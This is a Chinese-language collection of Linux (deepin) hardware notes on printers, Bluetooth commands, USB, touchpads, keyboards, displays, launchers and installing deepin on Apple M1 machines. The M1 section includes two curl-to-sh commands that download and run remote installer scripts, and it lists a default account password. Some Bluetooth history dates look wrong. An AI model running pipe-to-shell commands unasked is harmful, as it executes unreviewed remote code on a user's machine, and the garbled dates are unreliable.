佳能LBP2900打印机安装驱动后需运行脚本：sudo /opt/cndrvcups-capt/addprinter.sh LBP2900 CNCUPSLBP2900CAPTK.ppd /dev/usb/lp0。

爱普生L358墨仓式一体机驱动下载链接：http://download.ebz.epson.net/dsc/search/01/search/?OSC=LX。

爱普生L358与L355驱动通用，添加时搜索不到L358可搜索L355。

爱普生DEB软件包安装命令：sudo dpkg -i *.deb。

爱普生扫描仪驱动解压后，在目录执行sudo sh ./install.sh安装。

CUPS网页端管理地址：http://localhost:631/。

lpstat -r命令用于查看打印机是否正在运行。

lpstat -d命令用于查看默认的打印机。

lpq命令用于检查打印文件缓冲区队列，报告作业状态。

找不到打印机时，可到厂商官网或https://wiki.linuxfoundation.org/openprinting/start查看驱动支持。

东芝e-studio357网络打印机驱动下载地址：http://business.toshiba.com/usa/support/downloads.jsp?SELCTD_MODEL=e-STUDIO357&AXN=SELCTD&site=usa。

打印任务显示暂停，可编辑/etc/samba/smb.conf，在[global]块添加client max protocol = NT 1。

标题：蓝牙安装与卸载
蓝牙是一种无线个人局域网，射频频率是2.45GHZ，使带电子端口的设备能在小范围内无线通信。

Blueman提供常见的蓝牙管理功能，可通过命令安装和卸载。

安装Blueman的命令：sudo apt-get install blueman。

卸载Blueman的命令：sudo apt-get remove blueman。

蓝牙名称来源于10世纪丹麦和挪威国王蓝牙哈拉尔的绰号“Blåtand”。

标题：蓝牙基础控制命令
查询蓝牙接口信息，在终端中输入：hciconfig

打开蓝牙开关，在终端中输入：sudo hciconfig hci0 up

关闭蓝牙开关，在终端中输入：sudo hciconfig hci0 down

搜索蓝牙外设，在终端中输入：hcitool scan

配对蓝牙外设，在终端中输入：bluetoothctl pair [外设mac地址]

查看已成功配对的设备，在终端中输入：bluetoothctl paired-devices

查看已配对设备连接状态，在终端中输入：bluetoothctl info [外设mac地址]

断开已配对设备，在终端中输入：bluetoothctl disconnect [外设mac地址]

连接已配对设备，在终端中输入：bluetoothctl connect [外设mac地址]

删除配对设备，在终端中输入：bluetoothctl remove [外设mac地址]

标题：hcitool命令:蓝牙调试工具
hcitool命令用于配置蓝牙连接，并向蓝牙设备发送一些特殊命令。

如果没有给定命令，或者使用了选项-h，hcitool会打印一些使用信息并退出。

hcitool的选项有--help（显示帮助）和-i dev（指定HCI设备）。

hcitool的命令包括dev（显示本地设备）、inq（查询远程设备）等。

hcitool scan命令用于扫描远程设备。

在终端输入hcitool dev可显示本地设备。

hcitool name命令用于获取远程设备的名称。

hcitool info命令可获取远程设备的信息。

hcitool con命令用于显示活跃连接。

hcitool cc命令用于创建与远程设备的连接。

hcitool dc命令用于断开与远程设备的连接。

hcitool lescan命令用于开始LE扫描。

hcitool leinfo命令用于获取LE远程信息。

标题：蓝牙的发展史及经典与低功耗蓝牙区别
蓝牙技术是爱立信于1994年研发的，目的是淘汰传统串口数据线，1997年由英特尔工程师命名为Bluetooth。

2001年索尼爱立信T39mc成为第一款内置蓝牙的手机，2002年蓝牙1.1版正式推出，1.2版增加抗干扰跳频功能。

蓝牙2.0版新增EDR技术，传输率最高可达3Mbps，2012年苹果MacOSX v10.2、微软Windows XP SP2/3等开始支持。

蓝牙3.0版最高传输速度24Mbps，可满足视频传输，2009年高速发展，但存在功耗过高问题。

2012年蓝牙4.0版发布，大幅降低功耗，提升抗干扰性、连接速度和距离，最远100m，4.1、4.2版增强安全性。

2016年蓝牙5.0版推出，定位精度1米以内，传输速度比4.2版更快，有效工作距离300米，苹果8以上手机使用。

2010年前只有经典蓝牙，1.0/2.0/2.1/3.0均为经典蓝牙，包含BR、EDR和HS(AMP)模式。

2010年SIG合并Wibree联盟，将其低功耗技术命名为低功耗蓝牙（BLE），蓝牙4.0规格同时包含经典和低功耗蓝牙。

SIG在蓝牙4.0规格中定义BR、EDR、AMP和LE四种controller技术，人们将BR/EDR/AMP称为经典蓝牙技术。

SIG曾称低功耗蓝牙为Bluetooth Smart，经典蓝牙为Bluetooth，双模为Bluetooth Smart Ready，后统一用Bluetooth品牌。

蓝牙4.1/4.2/5.0均包含低功耗和经典蓝牙，经典蓝牙用于音频传输等，低功耗用于可穿戴设备等，两者不能直接通信。

双模蓝牙设备同时支持低功耗和经典蓝牙，如手机、电脑等，通过分时机制切换模式实现与两类设备通信。

标题：USB设备
USB设备指与USB接口连接的设备，此页面介绍鼠标、键盘、打印机以外的USB设备。

图形查看USB设备：通知区-存储设备即可查看。

命令查看USB设备：终端执行lsusb可查看系统当前USB设备。

lsusb命令的参数-D：不扫描/proc/bus/usb，而以指定的设备路径取代。

lsusb命令的参数-p：使用其他USB设备在内核的路径，默认为/proc/bus/usb。

lsusb命令的参数-t：将USB设备以树状架构输出。

lsusb命令的参数-v：列出较详细的运行过程。

lsusb命令的参数-vv：列出完整的运行过程。

标题：触摸板
触摸板（TouchPad 或 TrackPad），是一种广泛应用于笔记本电脑上的输入设备。其利用用户手指的移动来控制指针的动作。

设置-鼠标-插入鼠标时禁用触摸板

sudo modprobe psmouse  ##启用触摸板；sudo rmmod psmouse     ##禁用触摸板

synclient TouchpadOff=1    ##禁用触摸板；synclient TouchpadOff=0    ##恢复触摸板（适用于ThinkPad之类含有摇杆的机型，可仅禁用触摸板而保留摇杆）

设置-鼠标-自然滚动

交换滚动方向的信号，编辑家目录下的.Xmodmap文件（终端执行gedit ~/.Xmodmap），添加或修改内容为pointer = 1 2 3 5 4 7 6 8 9 10 11 12，注销再登录生效（适用于synaptics触摸板，会同时设置鼠标自然滚动）

在xf86-input-libinput驱动下，双指垂直滚动与边缘滚动只能二选一，谁后设置的谁生效；在xf86-input-synaptics下两者可以同时开启。

gsettings set com.deepin.dde.touchpad edge-scroll-enabled  true ## 开启边缘滚动

gsettings set com.deepin.dde.touchpad vert-scroll-enabled  true ## 开启双指垂直滚动

gsettings set com.deepin.dde.touchpad horiz-scroll-enabled true ## 开启双指水平滚动

部分acer等机型的笔记本无法使用触摸板，进入主板设置，查找touchpad项目，将它的状态由“Advance”改为“Basic”。

标题：键盘
键盘是经过系统安排操作机器或设备的一组键，主要功能是输入资料，由打字机键盘发展而来，可输入字符和控制电脑运行。

快捷键又名热键，是通过特定按键、顺序或组合完成操作的全局按键；加速键是鼠标+键盘实现操作的按键，快捷键可自定义，加速键一般不可修改。

系统级快捷键可全局响应，无论焦点和程序运行情况；应用程序级快捷键仅在当前活动程序中起作用，程序不活动时失效；快捷键冲突指同一快捷键对应两个功能且都启用，导致失效。

终端执行cat /proc/bus/input/devices可查看当前USB设备信息。

键盘调整可使用深度系统设置修改，也可终端执行sudo dpkg-reconfigure keyboard-configuration命令修改。

USB键盘无法使用时，可插入usb2.0接口，若不行尝试使用PS/2键盘。

开启键盘背光需新建含特定内容的beiguang.sh文件，加可执行属性，终端运行sudo sh beiguang.sh后重新登录。

super键就是徽标键，一般在Ctrl和Alt之间。

标题：苹果（M1）中安装deepin
苹果（M1）安装deepin的重要参考资料：Asahi Linux: https://asahilinux.org/；Asahi Linux Wiki: https://github.com/AsahiLinux/docs/wiki/；Asahi Linux Debian installer: https://git.zerfleddert.de/cgi-bin/gitweb.cgi/m1-debian。

在苹果（M1）设备上安装并使用deepin需要准备：deepin rootfs、m1n1、打包可支持M1 GPU的Mesa修改版、启动DDE桌面、ARM仓库。

使用deepin的安装仓库时，在MacOS的Terminal中运行命令：curl https://ci.deepin.com/repo/deepin/deepin-ports/deepin-m1/deepin.install | sh。

运行deepin安装脚本后，需关机；Mac Mini开机时长摁开机键直至出现启动菜单，选择deepin，按脚本设置为默认启动项。

deepin系统默认用户为hiweed，密码为1。

自行搭建安装仓库时，打rootfs包需安装的依赖：debootstrap、eatmydata、pigz、qemu-user-static（非ARM机器需要）。

自行搭建安装仓库需创建链接：sudo ln -s /usr/share/debootstrap/scripts/buster /usr/share/debootstrap/scripts/beige。

非deepin发行版搭建仓库需获取keyring：/usr/share/keyrings/deepin-archive-camel-keyring.gpg，可通过解包deepin-keyring包获得。

自行搭建的deepin安装仓库结构：/path/to/repo下有asahilinux.install（可选）、installer_data.json，os目录下有deepin-base.zip和deepin-desktop.zip。

使用deepin 23 for (M1)安装盘时，需在U盘创建FAT分区，命令为：DEVICE=/dev/sdX；sudo parted -a optimal $DEVICE mklabel msdos；sudo parted -a optimal $DEVICE mkpart primary fat32 2048s 100%；sudo mkfs.vfat ${DEVICE}1；sudo mount ${DEVICE}1 /mnt。

deepin 23 for (M1)安装盘压缩包需下载后解压到U盘FAT分区的根目录，下载地址：https://ci.deepin.com/repo/deepin/deepin-ports/deepin-m1/deepin-m1-usb-installer.zip。

在Mac上安装m1n1+uboot引导的命令：curl https://alx.sh/ | sh，需选第三项UEFI environment only, m1n1+uboot+esp。

使用deepin安装盘安装时，需选择自定义安装，选择空闲磁盘空间；不可选全盘安装或高级安装，否则可能抹除MacOS系统和引导导致机器变砖。

DDE桌面环境已知问题：系统GPU加速无法使用，可能导致Chromium无法正常启动。

DDE桌面环境已知问题：系统无法识别任何声音设备，导致无声音播放功能，仅小概率刚安装完成时有声音。

DDE桌面环境已知问题：长时间不动鼠标会导致其被休眠而无法使用，需点击鼠标按键重新使用。

DDE桌面环境已知问题：重启后桌面无壁纸。

卸载deepin系统可使用脚本：https://github.com/AsahiLinux/asahi-installer/blob/main/tools/wipe-linux.sh。

重启后local policy update没跑完就黑屏重启，需在recoveryOS或禁用SIP的情况下，跑官方的cleanbp.sh脚本清启动策略；recoveryOS呼出terminal方法：shift+win+t（普通en_US键盘）。

标题：KRuler
KRuler是一款制定屏幕分辨率规则和颜色测量的工具，界面是仿真黄色计量尺，可测屏幕两点长度，测量单位可选。

KRuler的安装命令为sudo apt-get install kruler。

KRuler的卸载命令为sudo apt-get remove kruler。

KRuler的仓库地址是http://packages.deepin.com/deepin/pool/main/k/kruler/。

标题：屏幕色温控制_Flux
f.lux是一款自动调整屏幕色温亮度的应用，可预设色温范围，白天≤6500K，晚上≥3500K，随时间变化调整屏幕色温，过滤蓝光，减少眼疲劳。

安装f.lux的命令是sudo apt-get install fluxgui。

卸载f.lux的命令是sudo apt-get remove fluxgui。

f.lux的仓库地址是http://packages.deepin.com/deepin/pool/contrib/f/fluxgui/。

标题：鼠标
鼠标是常用电脑输入设备，可定位光标，通过按键和滚轮操作屏幕元素。

依据移动感应技术，鼠标分为机械鼠标、早期光电鼠标、光电机械鼠标、现代光电鼠标、激光鼠标、蓝光鼠标。

终端执行lspci | grep Mouse可查看PCI设备上的鼠标，执行lsusb | grep Mouse可查看USB设备上的鼠标。

鼠标设置方法一：使用Natural scrolling软件。方法二：修改家目录下的.Xmodmap文件，添加pointer = 1 2 3 5 4 7 6 8 9 10 11 12，注销再登录生效，此方法会同时设置触摸板。

常见问题：USB鼠标键盘无法使用，可插入usb2.0接口，不行则尝试PS/2鼠标。

相关链接有维基百科:鼠标和更改 Ubuntu 触摸板滚动为自然滚动。

标题：显示器-2
显示屏（英语：display device），也称显示屏、荧幕、荧光幕，一种输出设备（Output device），用于显示图像及色彩。

显示器主要分类: 阴极射线管显示屏 (CRT)、液晶显示屏 (LCD)、等离子显示屏 (PDP)、投影式显示屏、立体成像显示屏、有机发光二极管显示屏、电子纸、发光二极管显示屏。

查看显示器信息，终端执行: xrandr。更多选项请参考xrandr的帮助文档：man xrandr。

xrandr --output VGA-1 --right-of LVDS-1     设置VGA-1（外置显示器）在LVDS-1的右侧。

cvt 1920 1080        查看1920×1080的信息。

sudo xrandr --newmode "1920x1080_60.00″ 173.00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync"    将cvt命令显示的结果加在newmode后替换。

sudo xrandr --addmode VGA-1 “1920x1080_60.00″    添加新的1920×1080分辨率加给VGA-1。

xrandr --output VGA-1 --mode 1920x1080_60.00 --rate 60    将理想分辨率设置外置显示器分辨率。

注：在命令行中输入1920×1080中的乘号时，用字母“x”替代即可。

标题：桌面快捷方式(启动器)
linux的桌面快捷方式是具有特定格式的文本文件，也叫启动器，后缀为.desktop。

创建和管理Linux桌面快捷方式的工具包括：exo-desktop-item-edit（适用于xfce和deepin桌面环境）、desktop-file-validate（验证格式）、desktop-file-install（安装到系统菜单）、exo-open和dex（命令行打开启动器）。

创建启动器时，普通账户目录下的命令需用绝对路径（因root账户的$PATH可能无法访问），常见路径（如/usr/bin）的命令可简写；可用which命令查命令位置，或通过任务管理器找运行程序的命令路径。

在命令行执行.desktop启动器的命令有：exo-open test.desktop 或 dex test.desktop。

将启动器加入系统菜单：先安装desktop-file-utils，用desktop-file-validate验证格式，再用desktop-file-install安装（--dir指定用户菜单路径~/.local/share/applications，不指定则为系统菜单需管理员权限），最后update-desktop-database更新菜单。

将启动器加入自动启动，只需拷贝到~/.config/autostart/目录。

.desktop文件是ini格式，包含[组名]和键=值，[Desktop Entry]是必须的组，井号开头为注释，注意大小写。

Type键的可能值为Application（程序）、Link（链接）、Directory（目录）；Version是.desktop规范的版本；Name是启动器名称；GenericName是通用名；Comment是提示说明。

Exec键定义实际执行的程序，可包含环境变量和参数，如%f（单个选定文件路径）、%F（多个选定文件路径）、%u（单个url）、%U（多个url）等，由桌面环境传递给程序。

Actions键用于定义非默认动作（如不同参数或命令），需在[Desktop Action 动作名]组中指定Exec、Name、Icon等。

Categories的常见类名及描述：AudioVideo（多媒体）、Audio（音频）、Video（视频）、Development（开发）、Education（教育）、Game（游戏）、Graphics（图像处理）等。

MimeType格式为“主类/子类”，如text/plain（纯文本）、image/jpeg（jpg）、video/mp4（mp4）、application/zip（zip压缩）等。

Icon支持png和svg格式，常用大小有16*16、24*24、32*32等；存放于$XDG_DATA_DIRS/icons或/usr/share/pixmaps时无需绝对路径，默认主题为hicolor。

